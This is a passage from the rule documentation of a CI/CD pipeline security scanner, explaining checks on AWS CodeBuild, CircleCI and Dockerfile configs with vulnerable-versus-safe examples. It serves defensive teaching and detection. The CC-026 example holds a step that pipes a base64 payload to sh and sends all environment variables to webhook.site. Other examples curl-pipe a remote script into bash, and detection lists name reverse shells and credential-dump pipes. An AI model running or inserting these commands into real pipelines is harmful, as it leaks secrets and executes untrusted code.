**Source:** [`CB-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-008`: CodeBuild buildspec is inline (not sourced from a protected repo) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-008 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.

**Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.

**Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-009`: CodeBuild image not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-009 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** CodeBuild pulls the environment image on every build. A tag pointer can be moved by whoever controls the registry; a digest cannot. AWS-managed ``aws/codebuild/...`` images are exempt. Those are covered by CB-005 and are not part of the tag-mutation threat model.

**Recommendation.** Pin custom CodeBuild images by ``@sha256:<digest>``. Tag-based references (``:latest``, ``:1.2.3``) can be silently overwritten to point at a malicious layer that is pulled on the next build.

**Source:** [`CB-009`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Scans the ``source.buildspec`` text on every CodeBuild project for concrete attack indicators: reverse shells, base64-decoded execution, miner binaries/pools, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands. CB-011 is CRITICAL by design, a true positive is evidence of compromise, not a hygiene improvement. Repo-sourced buildspecs (not inlined) return ``NOT APPLICABLE`` because the text isn't visible to the scanner; CB-008 already flags the inline form as a governance gap.

**Recommendation.** Treat as a potential compromise. Identify which principal or pipeline ran the CodeBuild project recently, rotate its service role's credentials, audit CloudTrail for outbound activity to the matched hosts, and, if an inline buildspec is in use (CB-008), enforce repo-sourced buildspecs under branch protection so the next malicious edit requires a PR.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.

**Recommendation.** Pin every orb to an exact semver version (`circleci/node@5.1.0`). Floating references like `@volatile`, `@1`, or bare names without `@` resolve to whatever is latest at build time, allowing a compromised orb update to execute in the pipeline.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``circleci/aws-cli@volatile`` (or any non-
# semver ref) resolves at config-process time to whatever
# the orb publisher last pushed. A compromised publisher
# ships malicious orb steps into every consumer's pipeline.
version: 2.1
orbs:
  aws-cli: circleci/aws-cli@volatile
  python: circleci/python@dev:alpha

# Safe: pin to an exact semver (``X.Y.Z``). Renovate's
# circleci ecosystem updater bumps the pin in reviewable
# PRs; ``@volatile`` and ``@dev:*`` never reach prod.
version: 2.1
orbs:
  aws-cli: circleci/aws-cli@4.1.3
  python: circleci/python@2.1.1
```

**Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).

### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.

**Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.

**Proof of exploit.**

```
# Vulnerable: ``cimg/python:3.12`` is a mutable tag.
# CircleCI's image team rebuilds it on every Python
# point release; a publisher compromise ships code into
# every pipeline that uses the tag.
version: 2.1
jobs:
  test:
    docker:
      - image: cimg/python:3.12
    steps:
      - run: pytest

# Safe: pin to the content-addressable digest.
version: 2.1
jobs:
  test:
    docker:
      - image: cimg/python@sha256:abc123...  # cimg/python:3.12.1
    steps:
      - run: pytest
```

**Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).

### `CC-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`CC-006`](../providers/circleci.md#cc-006) in the [CircleCI provider](../providers/circleci.md).

### `CC-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.

**Source:** [`CC-007`](../providers/circleci.md#cc-007) in the [CircleCI provider](../providers/circleci.md).

### `CC-009`: Deploy job missing manual approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-009 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** In CircleCI, manual approval is implemented by adding a job with `type: approval` to the workflow and making the deploy job require it. Without this gate, any push to the triggering branch deploys immediately with no human review.

**Recommendation.** Add a `type: approval` job that precedes the deploy job in the workflow, and list it in the deploy job's `requires:`. This ensures a human must click Approve in the CircleCI UI before production changes roll out.

**Source:** [`CC-009`](../providers/circleci.md#cc-009) in the [CircleCI provider](../providers/circleci.md).

### `CC-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-018 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a CircleCI config. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: pip resolves and downloads packages over
# plaintext HTTP, so a network attacker between the
# runner and the registry can substitute the wheel.
# ``--trusted-host`` silences the very error that would
# have caught the swap.
version: 2.1
jobs:
  install:
    docker:
      - image: cimg/python@sha256:abc123...
    steps:
      - run: |
          pip install --index-url http://internal-pypi.example.com/simple \
                      --trusted-host internal-pypi.example.com \
                      -r requirements.txt

# Safe: HTTPS with the index's certificate validated.
# Internal CA installed into the image trust store.
version: 2.1
jobs:
  install:
    docker:
      - image: cimg/python@sha256:abc123...
    steps:
      - run: |
          pip install --index-url https://internal-pypi.example.com/simple \
                      --require-hashes -r requirements.txt
```

**Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).

### `CC-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-020 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`CC-020`](../providers/circleci.md#cc-020) in the [CircleCI provider](../providers/circleci.md).

### `CC-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-021`](../providers/circleci.md#cc-021) in the [CircleCI provider](../providers/circleci.md).

### `CC-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`CC-022`](../providers/circleci.md#cc-022) in the [CircleCI provider](../providers/circleci.md).

### `CC-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-024 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Signing (``cosign sign``) binds identity to bytes; attestation (``cosign attest``) binds a structured claim about *how* the artifact was built. SLSA verifiers check the latter so consumers can enforce builder/source/parameter policies.

**Recommendation.** Add a ``run: cosign attest`` command against a ``provenance.intoto.jsonl`` statement, or use the ``circleci/attestation`` orb. CC-006 covers signing; this rule covers the build-provenance step SLSA Build L3 requires.

**Source:** [`CC-024`](../providers/circleci.md#cc-024) in the [CircleCI provider](../providers/circleci.md).

### `CC-026`: Config contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cc-026 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires on concrete indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, credential-dump pipes, history-erasure).

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any contexts/env vars the pipeline can reach, and audit recent CircleCI runs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Proof of exploit.**

```
# Vulnerable: a step body contains ``curl /tmp/.miner |
# bash`` or pipes a base64-decoded payload to ``sh``. A
# malicious PR (or a compromised co-maintainer) plants
# the crypto-miner / credential-stealer in the config
# itself; every subsequent build executes the payload.
version: 2.1
jobs:
  build:
    docker:
      - image: alpine@sha256:abc123...
    steps:
      - run: |
          echo Z2g6Li4uIA== | base64 -d | sh   # obfuscated payload
          curl https://webhook.site/abc?env=$(env|base64)

# Safe: the build does only what the build does. No
# obfuscated execution, no exfil POSTs, no ``base64
# -d | sh`` pipelines. If a check fires here it's
# either a compromise or a CTF fixture; treat as
# incident-response until verified otherwise.
version: 2.1
jobs:
  build:
    docker:
      - image: alpine@sha256:abc123...
    steps:
      - checkout
      - run: make build
```

**Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).

### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Complements CC-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`CC-028`](../providers/circleci.md#cc-028) in the [CircleCI provider](../providers/circleci.md).

### `CC-029`: Machine executor image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-029 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** CC-003 covers Docker images declared under ``docker:`` blocks. It does not reach the machine executor, where the image is on ``machine.image``. A rolling tag (``current``, ``edge``, ``default``) pulls a fresh image whenever CircleCI publishes one, reintroducing the same supply-chain risk Docker-image pinning is designed to eliminate.

**Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.

**Proof of exploit.**

```
# Vulnerable: ``image: default`` resolves to whatever
# CircleCI ships as the current default machine image.
# Image updates rebuild the underlying OS / toolchain
# silently; a compromise of the image build pipeline
# ships malicious bytes into every machine-executor
# pipeline that uses the default.
version: 2.1
jobs:
  integration:
    machine:
      image: default
    steps:
      - run: docker compose run tests

# Safe: pin to a specific image release. CircleCI's
# release notes document each tag; pin to the SHA-
# stamped tag rather than the rolling alias.
version: 2.1
jobs:
  integration:
    machine:
      image: ubuntu-2204:2024.01.1
    steps:
      - run: docker compose run tests
```

**Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).

### `CD-002`: AllAtOnce deployment config, no canary or rolling strategy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cd-002 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** AllAtOnce shifts 100% of traffic to the new revision in one step. There's no gradient to halt on if a CloudWatch alarm trips mid-rollout, the bad revision is already serving every request. Canary / linear configs introduce the shift-then-watch shape that lets monitors catch a regression before it's universal.

**Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.

**Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation), [`ENF-2`](#ctrl-enf-2) L2: Break the build when a violation is detected.

**How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.

**Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.

**Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** The pipeline's S3 artifact store holds intermediate build outputs handed between stages. Default SSE-S3 (AES256) encrypts at rest but uses an AWS-owned key whose policy you can't scope. A customer-managed CMK gives the same key-policy + CloudTrail Decrypt-event audit story you'd apply to Lambda code, Secrets Manager, or any other build output.

**Recommendation.** Configure a customer-managed AWS KMS key as the encryptionKey for each artifact store. This enables key rotation, fine-grained access policies, and CloudTrail auditing of decrypt operations.

**Source:** [`CP-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-005`: Production Deploy stage has no preceding ManualApproval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-005 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation), [`ENF-2`](#ctrl-enf-2) L2: Break the build when a violation is detected.

**How this is detected.** The complement to CP-001: this rule fires only on stages whose name contains ``prod`` / ``production`` / ``live``. Even teams that intentionally skip approvals for dev / staging deploys usually want a human in the loop for a production-tagged target.

**Recommendation.** Add a ``Manual`` approval action immediately before any stage whose name contains ``prod`` / ``production``. CP-001 covers the generic case; this rule specifically looks at production-tagged stages where the blast radius of an unreviewed deploy is largest.

**Source:** [`CP-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization, [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Proof of exploit.**

```
# Vulnerable: ``python:3.12-slim`` is a tag, and tags on
# Docker Hub are mutable. Python's publishers can (and do)
# repoint the same tag at a new image on every point
# release, and namespace takeovers / hijacked publisher
# accounts can silently swap a malicious image under the
# existing tag. The next rebuild picks up whatever's there
# now, with no signal to the consumer that the base
# changed.
FROM python:3.12-slim
COPY . /app
RUN pip install --require-hashes -r /app/requirements.txt
CMD ["python", "/app/main.py"]

# Safe: pin to the immutable sha256 digest. The leading
# comment documents which tag the digest corresponds to.
# Renovate / Dependabot's Docker ecosystem updaters resolve
# and bump these on a schedule so the pin doesn't drift
# behind security patches.
# python:3.12.1-slim (refreshed YYYY-MM-DD)
FROM python:3.12-slim@sha256:abc123...
COPY . /app
RUN pip install --require-hashes -r /app/requirements.txt
CMD ["python", "/app/main.py"]
```

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization, [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** ``ADD`` with a URL is the historical Dockerfile footgun: it fetches at *build* time over HTTP(S) with no checksum and no signature, and the registry tag does not pin the source. A tampered server or DNS hijack silently swaps the content. ``COPY`` is for local files; ``RUN curl + verify`` is for remote ones.

**Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.

**Known false positives.**

- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.

**Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).

**Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.

**Proof of exploit.**

```
# Vulnerable: curl-pipe to bash trusts both the network
# (any MITM substitutes the script in flight) and the host
# (a compromised installer endpoint silently serves attacker
# code). The script then runs as root inside the build
# context, so anything it writes lands in the final image.
FROM ubuntu:24.04@sha256:abc123...
RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates
RUN curl -fsSL https://example-installer.example/install.sh | bash

# Safe: download to a file, verify a sha256 digest from a
# trusted source (the project's signing key, the vendor's
# release manifest), then execute. If the upstream content
# changes the digest stops matching and the build fails
# before the malicious code runs.
FROM ubuntu:24.04@sha256:abc123...
RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates
RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
    && echo 'a1b2c3d4...  /tmp/install.sh' | sha256sum -c - \
    && bash /tmp/install.sh \
    && rm /tmp/install.sh
```

**Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-010`: apt-get dist-upgrade / upgrade pulls unknown package versions <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-010 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Running ``apt-get upgrade`` (or ``dist-upgrade``) inside a Dockerfile is the classic pet-vs-cattle anti-pattern. Two back-to-back builds with the same Dockerfile can produce different images because the upstream archive moved between the two ``RUN`` invocations. ``dist-upgrade`` additionally relaxes dependency resolution. It can install / remove arbitrary packages to satisfy upgrades, so the resulting image's package set isn't even bounded by what the Dockerfile declares.

**Recommendation.** Drop the upgrade step. Build on a recent base image instead (rebuild your image when the base image gets a security patch, pin the base by digest per DF-001 so the rebuild is deterministic). ``apt-get install pkg=<version>`` for specific packages stays reproducible; ``upgrade`` / ``dist-upgrade`` does not.

**Source:** [`DF-010`](../providers/dockerfile.md#df-010) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-011`: Package manager install without cache cleanup in same layer <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-011 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Each Dockerfile ``RUN`` produces a layer. Installing packages in one layer and cleaning the cache in a later layer leaves the cache files in the lower layer forever, final image size is unchanged and the residual files broaden the attack surface (e.g. apt's signed-by keys, package metadata). The fix is layout, not behavior: do install + cleanup in the same ``RUN``.

**Recommendation.** Combine the install and cleanup into the same ``RUN`` so the cache lands in a single layer that gets discarded together. Idiomatic pattern: ``RUN apt-get update && apt-get install -y <pkgs> && rm -rf /var/lib/apt/lists/*``. Equivalent forms: ``apk add --no-cache <pkgs>``, ``dnf install -y … && dnf clean all``, ``yum install -y … && yum clean all``, ``zypper -n in … && zypper clean -a``.

**Source:** [`DF-011`](../providers/dockerfile.md#df-011) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-016`: Image lacks OCI provenance labels <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-016 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** The OCI image-spec annotation set is a small de facto standard maintained by the OCI working group. Only ``image.source`` and ``image.revision`` are checked because they're the two whose absence makes incident response materially harder; ``image.title`` / ``image.description`` are nice-to-have but the rule doesn't fire on those.

**Recommendation.** Add a ``LABEL`` line carrying at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). Most registries surface those fields in the UI and on ``manifest inspect``, which closes the source-to-image gap that GHA-006 / SLSA Build-L2 provenance attestation also addresses.

**Known false positives.**

- A multi-stage build's intermediate stages don't need provenance labels, only the final image ships. The rule fires per Dockerfile, not per stage; suppress for files where the final ``FROM`` is intentional throwaway scratch.

**Source:** [`DF-016`](../providers/dockerfile.md#df-016) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Three shapes are detected: ``pip install --trusted-host <host>``, ``pip install -i http://...`` (or ``--index-url http://...``), and ``pip install --extra-index-url http://...``. All three tell pip to accept whatever the upstream returns without certificate verification. The result is a build-time supply-chain MITM surface: anyone able to inject responses on the network path between the build host and the index can ship arbitrary wheels into the image. Complements the generic TLS-bypass primitive (which catches ``pip config set global.trusted-host``) by covering the per-invocation flag form most teams actually reach for.

**Recommendation.** Drop ``--trusted-host`` and switch any ``-i`` / ``--index-url`` / ``--extra-index-url`` to ``https://``. If the internal index has a self-signed certificate, install the CA into the image's truststore (``ca-certificates`` + ``update-ca-certificates``) instead of telling pip to skip verification. ``--trusted-host`` whitelists the host across the entire pip invocation, so a single ``RUN`` line ends up fetching every dependency over an unverified connection.

**Known false positives.**

- An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.

**Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-022`: RUN uses npm install instead of npm ci <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-022 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization, [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Mirrors GHA-022 / GL-022 / JF-021 (CI-side lockfile integrity) at the image-build layer. The build-time consequence is the same shape: dependency resolution happens against the live registry rather than against the committed lockfile, so the image ends up carrying whatever the registry served at build time rather than the set the team audited. The rule fires on bare ``npm install`` / ``npm i`` as well as on flagged variants (``--no-package-lock``, ``--force``, ``--legacy-peer-deps``) which all defeat the lockfile contract one way or another.

